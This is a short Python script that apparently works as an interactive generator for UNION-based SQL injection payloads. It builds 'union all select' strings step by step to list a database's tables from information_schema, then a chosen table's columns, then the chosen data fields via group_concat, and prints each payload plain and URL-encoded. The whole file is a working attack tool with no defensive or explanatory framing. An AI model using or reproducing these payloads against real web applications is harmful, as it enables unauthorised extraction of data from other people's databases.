text = int(input("Order by how many? > "))
print("\n")
def encode(intext):
    s = intext.encode('utf-8')
    s = s.hex()
    s = '%'.join(s[i:i+2] for i in range(0, len(s), 2))
    print("%20%"+s)
    print("\n")
i = 1
amount = ''
while i <= text:
    if i <= text -1:
        amount = amount + str(i)+","
    else:
        amount = amount + str(i)
    i +=1
selectStatement = "union all select "+ amount
print(selectStatement)
encode(selectStatement)
numberToAttack = input("Field to attack > ")
selectStatement = selectStatement.replace(","+str(numberToAttack)+",",",group_concat(table_name),")
selectStatement = selectStatement.replace ("--","")
selectStatement = selectStatement + " from information_schema.tables where table_schema=database()--"
print(selectStatement)
encode(selectStatement)
table = input("Table selection > ")
selectStatement = selectStatement.replace("table_name", "column_name")
selectStatement = selectStatement.replace("information_schema.tables where table_schema=database()--","information_schema.columns where table_name="+'"'+table+'"'+"--")
print(selectStatement)
encode(selectStatement)
data = input("Items to take (use commas to seperate values)> ")
data = data.split(",")
i =0
newdata = ""
while i < len(data):
    if i == len(data) - 1:
        newdata = newdata + data[i]
    else:
        newdata = newdata + data[i] + ",0x20,"
    i +=1
selectStatement = selectStatement.replace("group_concat(column_name)","group_concat("+newdata+")")
selectStatement = selectStatement.replace(('information_schema.columns where table_name="'+table+'"'+"--"),(table+"--"))
print(selectStatement)
encode(selectStatement)

   








